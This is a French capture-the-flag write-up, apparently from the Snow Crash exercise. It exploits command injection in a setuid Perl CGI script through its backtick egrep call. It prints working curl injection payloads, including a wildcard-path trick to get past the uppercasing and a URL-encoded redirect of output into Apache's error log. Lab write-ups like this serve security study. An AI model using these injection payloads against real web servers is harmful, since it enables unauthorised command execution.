Qui suis-je? Ou suis-je?
$ ls -la
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
(un script perl setuid)

Un script CGI donc servi par un serveur web

$ curl -I 192.168.1.27:4646                                                         !
HTTP/1.1 200 OK
Date: Fri, 29 Nov 2019 00:00:51 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2
Content-Type: text/html

$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";


sub t {
  $nn = $_[1];
  $xx = $_[0];
  // transforme le lowercase en uppercase
  $xx =~ tr/a-z/A-Z/;
  // Supprime tout ce qui suis un espace?
  $xx =~ s/\s.*//;
  // ICI il y a une faille c'est le subshell avec ``, ça execute le parametre, mais il y a une substitution dessus avant
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

// Si il y a 1 param print .. sinon .
sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}
// Prend 2 parametres x et y
n(t(param("x"), param("y")));

Il faut passer en parametre "x" une commande a executer. ce sera transforme en majuscule

Passer par une variable d'env?
$ export CMD="getflag > /tmp/coucou && chmod 777 /tmp/coucou"
$ curl '192.168.1.27:4646?x=`$CMD`'
non parce que c'est propre a level12 et flag12 l'aura pas

Si on met un nom de fichier unique on peut l'executer sans le path complet avec un wildcard
genre /*/ls trouve /bin/ls

$ ln -s /bin/getflag /tmp/GETFLAG
$ /*/GETFLAG
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)


Ca execute bien getflag via mon lien

$ echo coucou > /tmp/COUCOU
$ cat /*/COUCOU
coucou

ok il faut rediriger getflag vers ce fichier dans la commande injectee

$ curl '192.168.1.27:4646?x=;/*/GETFLAG > /*/COUCOU;'
(marche pas)

$ curl '192.168.1.27:4646?x=$(/*/GETFLAG>/*/COUCOU)'
(non plus)

On a acces aux logs Apache
$ tail /var/log/apache2/error.log
[Fri Nov 29 17:23:44 2019] [error] [client 192.168.1.22]
[Fri Nov 29 17:23:59 2019] [error] [client 192.168.1.22] sh: 1:
[Fri Nov 29 17:23:59 2019] [error] [client 192.168.1.22] cannot create /*/COUCOU: Directory nonexistent
[Fri Nov 29 17:23:59 2019] [error] [client 192.168.1.22]

(j'ai fait de la merde)
La substitution vire bien tout ce qui suis un espace, donc faut pas en mettre

Essayer de récupérer dans les logs d'erreur d'apache en redirigeant sur la sortie d'erreur
$ curl '192.168.1.27:4646?x=`/*/GETFLAG>&2`'
(marche pas. il prend & comme un second argument)

Encoder l'url https://www.urlencoder.org/
$ curl '192.168.1.27:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
$ tail /var/log/apache2/error.log
[Fri Nov 29 18:18:59 2019] [error] [client 192.168.1.22] Check flag.Here is your token : XXXXXXXXXXXXXXXXXxxx

YES
